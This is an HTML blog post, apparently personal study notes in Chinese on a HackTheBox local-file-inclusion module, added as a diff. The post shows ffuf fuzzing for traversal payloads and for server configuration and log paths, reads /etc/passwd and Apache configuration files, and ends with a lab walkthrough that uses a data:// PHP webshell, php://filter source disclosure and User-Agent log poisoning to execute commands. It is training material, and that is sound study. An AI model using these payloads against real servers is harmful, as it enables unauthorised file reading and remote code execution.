@@ -1,0 +1,569 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || File_inclusion:Automation and Prevention</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>File_inclusion:Automation and Prevention </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/17
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#00a596>
+                    base
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/practice" style=color:#03a9f4>
+                    practice
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/hackthebox" style=color:#ff7d73>
+                    hackthebox
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="Automated-Scanning"><a href="#Automated-Scanning" class="headerlink" title="Automated Scanning"></a>Automated Scanning</h1><p>了解文件包含攻击是如何工作的，以及我们如何手动制作高级有效载荷并使用自定义技术来实现远程代码执行，这一点至关重要。这是因为在许多情况下，我们要利用该漏洞，可能需要与其特定配置相匹配的自定义负载。此外，在处理WAF或防火墙等安全措施时，我们必须运用我们的理解来了解特定的有效负载&#x2F;角色是如何被阻止的，并试图制定一个自定义的有效负载来绕过它。<br>在许多琐碎的情况下，我们可能不需要手动利用LFI漏洞。有许多自动化方法可以帮助我们快速识别和利用微不足道的LFI漏洞。我们可以使用模糊化工具来测试大量常见的LFI有效载荷，看看其中是否有任何一个有效，或者我们可以使用专门的LFI工具来测试这些漏洞。</p>
+<span id="more"></span>
+
+<hr>
+<h2 id="Fuzzing-Parameters"><a href="#Fuzzing-Parameters" class="headerlink" title="Fuzzing Parameters"></a>Fuzzing Parameters</h2><p>用户可以在web应用程序前端使用的HTML表单往往经过适当的测试，并能很好地抵御不同的web攻击。然而，在许多情况下，页面可能有其他未链接到任何HTML表单的公开参数，因此普通用户永远不会访问或无意中造成伤害。这就是为什么对公开的参数进行模糊处理可能很重要，因为它们往往不如公共参数那么安全。</p>
+<p>一旦我们确定了一个未链接到我们测试的任何表单的公开参数，我们就可以执行本模块中讨论的所有LFI测试。这不仅适用于LFI漏洞，也适用于其他模块中讨论的大多数web漏洞，因为暴露的参数也可能容易受到任何其他漏洞的攻击。</p>
+<hr>
+<h2 id="LFI-wordlists"><a href="#LFI-wordlists" class="headerlink" title="LFI wordlists"></a>LFI wordlists</h2><p>到目前为止，在本模块中，我们一直在手动制作LFI有效载荷，以测试LFI漏洞。这是因为手动测试更可靠，可以发现LFI漏洞，否则可能无法识别，如前所述。然而，在许多情况下，我们可能想对参数进行快速测试，看看它是否容易受到任何常见LFI负载的攻击，这可能会为我们在需要测试各种漏洞的web应用程序中节省时间。<br>我们可以使用许多LFI单词列表进行此扫描。LFI-Jhadix.txt是一个很好的单词列表，因为它包含各种旁路和公共文件，所以可以很容易地同时运行几个测试。我们可以用这个单词表来模糊？language&#x3D;我们在整个模块中一直在测试的参数，如下所示：</p>
+<pre><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287
+</code></pre>
+<hr>
+<h2 id="Fuzzing-Server-Files"><a href="#Fuzzing-Server-Files" class="headerlink" title="Fuzzing Server Files"></a>Fuzzing Server Files</h2><p>除了模糊LFI有效载荷外，还有不同的服务器文件可能有助于我们利用LFI，因此了解这些文件存在于何处以及我们是否可以读取它们将很有帮助。这些文件包括：服务器webroot路径、服务器配置文件和服务器日志。</p>
+<hr>
+<h4 id="Server-Webroot"><a href="#Server-Webroot" class="headerlink" title="Server Webroot"></a>Server Webroot</h4><p>在某些情况下，我们可能需要知道完整的服务器webroot路径才能完成利用。例如，如果我们想定位我们上传的文件，但我们无法通过相对路径（例如..&#x2F;..&#x2F;uploads）到达其&#x2F;uploads目录。在这种情况下，我们可能需要找出服务器的webroot路径，以便我们可以通过绝对路径而不是相对路径来定位上传的文件。<br>为此，我们可以通过常见的webroot路径对index.php文件进行模糊处理，我们可以在Linux的单词列表 <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">wordlist for Linux</a> 或Windows的单词列表 <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">wordlist for Windows</a>中找到这些路径。根据我们的LFI情况，我们可能需要添加一些后台目录（例如..&#x2F;..&#x2F;..&#x2F;），然后添加我们的index.php后缀。</p>
+<pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287
+</code></pre>
+<hr>
+<h4 id="Server-Logs-x2F-Configurations"><a href="#Server-Logs-x2F-Configurations" class="headerlink" title="Server Logs&#x2F;Configurations"></a>Server Logs&#x2F;Configurations</h4><p>，我们需要能够识别正确的日志目录，以便能够执行我们讨论的日志中毒攻击。此外，正如我们刚刚讨论的那样，我们可能还需要阅读服务器配置，以便能够识别服务器webroot路径和其他重要信息（如日志路径！）。<br>要做到这一点，我们还可以使用LFI-Jhadix.txt单词列表，因为它包含了我们可能感兴趣的许多服务器日志和配置路径。如果我们想要更精确的扫描，我们可以将此单词列表用于Linux或将此单词表用于Windows，尽管它们不是seclist的一部分，所以我们需要首先下载它们。</p>
+<pre><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287
+</code></pre>
+<p>许多结果没有用LFI-Jhadix.txt单词列表识别，这向我们表明，在某些情况下，精确的扫描很重要。现在，我们可以尝试读取这些文件中的任何一个，看看是否可以获取它们的内容。我们将阅读（&#x2F;etc&#x2F;apache2&#x2F;apache2.conf），因为它是apache服务器配置的已知路径：</p>
+<pre><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/apache2.conf
+
+...SNIP...
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log
+        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined
+...SNIP...
+</code></pre>
+<p>正如我们所看到的，我们确实得到了默认的webroot路径和日志路径。然而，在这种情况下，日志路径使用全局apache变量（apache_log_DIR），该变量在我们上面看到的另一个文件（&#x2F;etc&#x2F;apache2&#x2F;envvars）中找到，我们可以读取它来查找变量值：</p>
+<pre><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/envvars
+...SNIP...
+export APACHE_RUN_USER=www-data
+export APACHE_RUN_GROUP=www-data
+# temporary state file location. This might be changed to /run in Wheezy+1
+export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
+export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
+export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+...SNIP...
+</code></pre>
+<p>正如我们所看到的，（APACHE_LOG_DIR）变量被设置为（&#x2F;var&#x2F;LOG&#x2F;apache2），之前的配置告诉我们日志文件是&#x2F;access.LOG和&#x2F;error.LOG，它们在上一节中已经访问过。</p>
+<p>注意：当然，我们可以简单地使用单词列表来查找日志，因为我们在本节中使用的多个单词列表确实显示了日志的位置。但本练习向我们展示了如何手动浏览已识别的文件，然后使用找到的信息进一步识别更多文件和重要信息。这与我们在PHP过滤器部分中读取不同的文件源非常相似，这样的努力可能会揭示以前未知的关于web应用程序的信息，我们可以使用这些信息来进一步利用它。</p>
+<hr>
+<h2 id="LFI-Tools"><a href="#LFI-Tools" class="headerlink" title="LFI Tools"></a>LFI Tools</h2><p>最后，我们可以利用许多LFI工具来自动化我们一直在学习的大部分过程，这在某些情况下可能会节省时间，但也可能会错过我们可能通过手动测试识别的许多漏洞和文件。最常见的LFI工具是LFISuite、LFiFreak和liffy。（ <a target="_blank" rel="noopener" href="https://github.com/D35m0nd142/LFISuite">LFISuite</a>, <a target="_blank" rel="noopener" href="https://github.com/OsandaMalith/LFiFreak">LFiFreak</a>, and <a target="_blank" rel="noopener" href="https://github.com/mzfr/liffy">liffy</a>. ）我们也可以在GitHub中搜索各种其他LFI工具和脚本，但一般来说，大多数工具执行相同的任务，成功率和准确性各不相同。<br>不幸的是，这些工具中的大多数都没有得到维护，并且依赖于过时的python2，因此使用它们可能不是一个长期的解决方案。试着下载上面的任何工具，并在我们在本模块中使用的任何练习中测试它们，以查看它们的准确性水平。</p>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><pre><code>target:104.248.166.174:31381
+</code></pre>
+<ul>
+<li>模糊web应用程序中公开的参数，然后尝试使用LFI单词列表之一来读取&#x2F;flag.txt</li>
+</ul>
+<p>先扫一下参数：</p>
+<pre><code>fuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://104.248.166.174:31381/index.php?FUZZ=key -t 80 -fs 2309 -mc 200 2&gt;/dev/null 
+view                    [Status: 200, Size: 1935, Words: 515, Lines: 56]
+</code></pre>
+<p>发现可以使用view，继续fuzz：</p>
+<pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31381/index.php?view=FUZZ -mc 200 2&gt;/dev/null -fs 1935
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
+../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
+../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
+../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
+../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
+../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
+</code></pre>
+<p>找到一个<code>/etc/passwd</code>,找一下webroot路径：</p>
+<pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../FUZZ/index.php -fs 1935
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../FUZZ/index.php
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 1935
+________________________________________________
+
+:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors
+/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
+:: Progress: [13/13] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:10] :: Error:: Progress: [13/13] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+</code></pre>
+<p>应该是这个<code>/var/www/html/</code>,然后再用jhaddix对webroot路径扫描</p>
+<pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../FUZZ -mc 200 2&gt;/dev/null -fs 1935
+           ...
+/etc/apache2/apache2.conf [Status: 200, Size: 9159, Words: 1456, Lines: 283]
+/etc/apt/sources.list   [Status: 200, Size: 4678, Words: 795, Lines: 105]
+/etc/group              [Status: 200, Size: 2546, Words: 515, Lines: 104]
+/etc/fstab              [Status: 200, Size: 1972, Words: 520, Lines: 57]
+/etc/hosts.allow        [Status: 200, Size: 2346, Words: 596, Lines: 66]
+/etc/hosts.deny         [Status: 200, Size: 2646, Words: 642, Lines: 73]
+/etc/hosts              [Status: 200, Size: 2172, Words: 520, Lines: 64]
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2172, Words: 520, Lines: 64]
+/etc/init.d/apache2     [Status: 200, Size: 10116, Words: 2014, Lines: 411]
+/etc/issue              [Status: 200, Size: 1961, Words: 519, Lines: 58]
+/etc/mysql/my.cnf       [Status: 200, Size: 2617, Words: 603, Lines: 77]
+/./././././././././././etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
+/etc/passwd             [Status: 200, Size: 3309, Words: 526, Lines: 82]
+/etc/nsswitch.conf      [Status: 200, Size: 2445, Words: 645, Lines: 76]
+     ...
+</code></pre>
+<p>扫描结果很多，找一些比较重要的文件，比如服务器配置文件之类的：</p>
+<p>浏览器访问这个配置文件：<code>/etc/apache2/apache2.conf</code></p>
+<pre><code>http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../etc/apache2/apache2.conf
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>  # This is the main Apache server configuration file.  It contains the
+# configuration directives that give the server its instructions.
+        ....
+DefaultRuntimeDir $&#123;APACHE_RUN_DIR&#125;
+PidFile $&#123;APACHE_PID_FILE&#125;
+# Timeout: The number of seconds before receives and sends time out.
+#
+Timeout 300
+
+#
+# KeepAlive: Whether or not to allow persistent connections (more than
+# one request per connection). Set to &quot;Off&quot; to deactivate.
+#
+KeepAlive On
+
+#
+# MaxKeepAliveRequests: The maximum number of requests to allow
+# during a persistent connection. Set to 0 to allow an unlimited amount.
+# We recommend you leave this number high, for maximum performance.
+#
+MaxKeepAliveRequests 100
+#
+# KeepAliveTimeout: Number of seconds to wait for the next request from the
+# same client on the same connection.
+#
+KeepAliveTimeout 5
+
+# These need to be set in /etc/apache2/envvars
+User $&#123;APACHE_RUN_USER&#125;
+Group $&#123;APACHE_RUN_GROUP&#125;
+...
+ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log
+</code></pre>
+<p>这里只截取了一部分，正如我们所看到的，我们确实得到了默认的webroot路径和日志路径。然而，在这种情况下，日志路径使用全局apache变量（apache_log_DIR），该变量在我们上面看到的另一个文件（&#x2F;etc&#x2F;apache2&#x2F;envvars   tip:第28行）中找到，我们可以读取它来查找变量值：</p>
+<p>访问：</p>
+<pre><code>http://104.248.166.174:31381/index.php?view=../../../../../../../../../../../../../../../../../etc/apache2/envvars
+</code></pre>
+<p>&#x3D;&#x3D;&gt;大概如下：</p>
+<pre><code># /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.
+export APACHE_RUN_USER=www-data
+export APACHE_RUN_GROUP=www-data
+# temporary state file location. This might be changed to /run in Wheezy+1
+export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
+export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
+export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+
+## The locale used by some modules like mod_dav
+export LANG=C
+## Uncomment the following line to use the system default locale instead:
+#. /etc/default/locale
+
+export LANG
+</code></pre>
+<p>我们看到第九行：APACHE_LOG_DIR&#x3D;&#x2F;var&#x2F;log&#x2F;apache2</p>
+<p>注意：当然，我们可以简单地使用单词列表来查找日志，因为我们在本节中使用的多个单词列表确实显示了日志的位置。但本练习向我们展示了如何手动浏览已识别的文件，然后使用找到的信息进一步识别更多文件和重要信息。这与我们在PHP过滤器部分中读取不同的文件源非常相似，这样的努力可能会揭示以前未知的关于web应用程序的信息，我们可以使用这些信息来进一步利用它。</p>
+<p>浏览器看一看日志文件，发现始终读取不了，不知道为啥，直接读取flag吧。</p>
+<h1 id="Skills-Assessment-File-Inclusion"><a href="#Skills-Assessment-File-Inclusion" class="headerlink" title="Skills Assessment - File Inclusion"></a>Skills Assessment - File Inclusion</h1><pre><code>target:104.248.166.174:31609
+</code></pre>
+<ul>
+<li>评估web应用程序，并使用各种技术来获得远程代码执行，并在文件系统的&#x2F;root目录中找到标志。提交标志的内容作为您的答案</li>
+</ul>
+<p>浏览一下页面，很快发现可能有文件包含漏洞：</p>
+<pre><code>http://104.248.166.174:31609/index.php?page=about
+</code></pre>
+<p>先看看有没有RCE的机会：</p>
+<pre><code>http://104.248.166.174:31609/index.php?127.0.0.1%EF%BC%9A31609/index.php
+</code></pre>
+<p>进入了主页面，试一试伪协议：</p>
+<pre><code>http://104.248.166.174:31609/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>Invalid input detected!
+</code></pre>
+<p>看来只能先用kali扫一扫目录了:</p>
+<pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31609/index.php?page=FUZZ -t 80  2&gt;/dev/null -mc 200
+</code></pre>
+<p>发现返回两种size的响应，但是都不能用，很烦，只能看看有没有其他页面，扫了很久都没有，看看源码有没有隐藏的注释：</p>
+<pre><code>http://104.248.166.174:31609/index.php?page=php://filter/read=convert.base64-encode/resource=index
+</code></pre>
+<p>然后解码，搜索用<code>//</code>或者<code>/* ... */</code>注释的内容，好家伙，真的有：</p>
+<pre><code>  // echo &#39;&lt;li&gt;&lt;a href=&quot;ilf_admin/index.php&quot;&gt;Admin&lt;/a&gt;&lt;/li&gt;&#39;; 
+</code></pre>
+<p>看一看这个ilf_admin&#x2F;index.php页面，好家伙，是管理员后台，有很多系统日志，但好像都不是我们能够控制的，但是我们发现URL是这样的：</p>
+<pre><code class="url">http://104.248.166.174:31609/ilf_admin/index.php?log=http.log	
+</code></pre>
+<p>难道？</p>
+<pre><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://104.248.166.174:31609/ilf_admin/index.php?log=FUZZ   -t 80  2&gt;/dev/null -fs 2046
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2289, Words: 155, Lines: 110]
+/../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../etc/passwd&amp;=%3C%3C%3C%3C [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130]
+</code></pre>
+<p>ok,try 一下：一般而言使用最短的</p>
+<pre><code>http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../etc/passwd
+</code></pre>
+<p>发现有结果，那么webroot差不多就在<code>../../../../../</code>这个位置了</p>
+<p>查看一下服务器，是nginx，偷个懒，直接看看常规的log位置能不能读取：</p>
+<pre><code>http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>        ....
+8.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/apache2/access.log&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51&quot;
+104.248.166.174 - - [17/Jun/2023:16:13:19 +0000] &quot;GET /ilf_admin/js/jquery.js HTTP/1.1&quot; 404 188 &quot;http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/apache2/access.log&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51&quot;
+104.248.166.174 - - [17/Jun/2023:16:13:19 +0000] &quot;GET /ilf_admin/c.css HTTP/1.1&quot; 404 188 &quot;http://104.248.166.174:31609/ilf_admin/index.php?log=../../../../../var/log/apache2/access.log&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51&quot;
+</code></pre>
+<p>hh,都在这里了，这下应该好弄了，先在url注入shell:<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
+<pre><code class="request">GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&amp;cmd=id HTTP/1.1
+Host: 138.68.165.36:31234
+Upgrade-Insecure-Requests: 1
+User-Agent: &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code class="log">[18/Jun/2023:01:25:42 +0000] &quot;GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log HTTP/1.1&quot; 200 2245 &quot;-&quot; &quot;uid=65534(nobody) gid=65534(nobody)
+&quot;
+</code></pre>
+<p>注入成功，读取即可</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
